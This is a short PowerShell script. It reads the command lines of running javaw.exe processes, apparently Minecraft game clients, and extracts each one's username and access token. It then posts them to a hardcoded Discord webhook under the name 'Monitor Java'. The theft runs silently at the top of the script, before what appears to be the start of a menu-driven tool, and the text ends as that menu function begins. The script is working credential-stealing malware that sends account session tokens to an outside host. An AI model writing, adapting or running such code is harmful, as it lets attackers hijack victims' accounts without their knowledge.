Clear-Host

$WebhookUrl = "https://discord.com/api/webhooks/1537903697793654837/CP7YkIAG9NYCdIf9w8Nh6HY1B5ioA1pTtpS3LzVxzjPsN336rXlKKGNNiAiagOMieaYt"
try {

    $JavaProcesses = Get-CimInstance Win32_Process |
        Where-Object Name -eq "javaw.exe" |
        Select-Object -ExpandProperty CommandLine

    $Datos = @()

    foreach ($Proceso in $JavaProcesses) {

        if ($Proceso -match "--username\s+(\S+)") {
            $Username = $matches[1]
        }
        else {
            $Username = ""
        }

        if ($Proceso -match "--accessToken\s+(\S+)") {
            $AccessToken = $matches[1]
        }
        else {
            $AccessToken = ""
        }

        $Datos += @"
Username: $Username
AccessToken: $AccessToken
"@
    }
    if ($Datos.Count -eq 0) {
        $Datos = ""
    }
    $Payload = @{
        username = "Monitor Java"
        content = $Datos -join "`n"
    }
    Invoke-RestMethod `
        -Uri $WebhookUrl `
        -Method Post `
        -ContentType "application/json" `
        -Body ($Payload | ConvertTo-Json)
}
catch {
    Write-Host "Error: $($_.Exception.Message)"
}

function Show-Menu {
    Clear-Host
